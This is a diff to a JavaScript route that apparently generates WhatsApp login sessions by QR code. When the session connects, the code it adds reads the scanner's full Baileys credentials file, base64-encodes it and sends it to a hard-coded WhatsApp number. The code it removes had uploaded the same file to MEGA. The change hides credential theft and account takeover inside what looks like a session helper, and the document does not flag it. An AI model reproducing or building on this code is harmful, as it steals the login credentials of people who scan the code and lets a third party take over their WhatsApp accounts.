@@ -85,34 +85,24 @@ router.get('/', async (req, res) => {
                 if (connection === "open") {
                     try {
                         await delay(3000);
-                        // Send message to fixed numbe
-                         if (fs.existsSync('./auth_info_baileys/creds.json'));
-                           const auth_path = './auth_info_baileys/';
-        let user = '917003816486@s.whatsapp.net';
+                        
+                        if (fs.existsSync('./auth_info_baileys/creds.json')) {
+                            const auth_path = './auth_info_baileys/';
+                            let user = '917003816486@s.whatsapp.net';
 
-                        function randomMegaId(length = 6, numberLength = 4) {
-                            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                            let result = '';
-                            for (let i = 0; i < length; i++) {
-                                result += characters.charAt(Math.floor(Math.random() * characters.length));
-                            }
-                            const number = Math.floor(Math.random() * Math.pow(10, numberLength));
-                            return `${result}${number}`;
+                            // Read and send credentials as base64 encoded session
+                            const credsData = fs.readFileSync(auth_path + 'creds.json', 'utf8');
+                            const sessionData = Buffer.from(credsData).toString('base64');
+
+                            let msgsss = await socket.sendMessage(user, { text: "KAISEN~" + sessionData });
+                            await socket.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
                         }
 
-                      
-             const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
-                            const string_session = mega_url.replace('https://mega.nz/file/', '');
-
-                            let msgsss = await socket.sendMessage(user, { text: "KAISEN~" + string_session });
-                            await socket.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
-                        
-
-                         await delay(1000);
+                        await delay(1000);
                         try { await fs.emptyDirSync('./auth_info_baileys'); } catch (e) {}
 
                     } catch (e) {
-                        console.log("Error during file upload or message send: ", e);
+                        console.log("Error during session handling: ", e);
                     }
 
                     await delay(100);
@@ -128,7 +118,7 @@ router.get('/', async (req, res) => {
                         console.log("Connection Lost from Server!");
                     } else if (reason === DisconnectReason.restartRequired) {
                         console.log("Restart Required, Restarting...");
-                        SUHAIL().catch(err => console.log(err));
+                        generateQRSession().catch(err => console.log(err));
                     } else if (reason === DisconnectReason.timedOut) {
                         console.log("Connection TimedOut!");
                     } else {
@@ -142,8 +132,6 @@ router.get('/', async (req, res) => {
 
         } catch (err) {
             console.log("Error in QR session:", err);
-            exec('pm2 restart qasim');
-            generateQRSession();
             await fs.emptyDirSync('./auth_info_baileys');
             if (!res.headersSent) {
                 res.status(500).json({
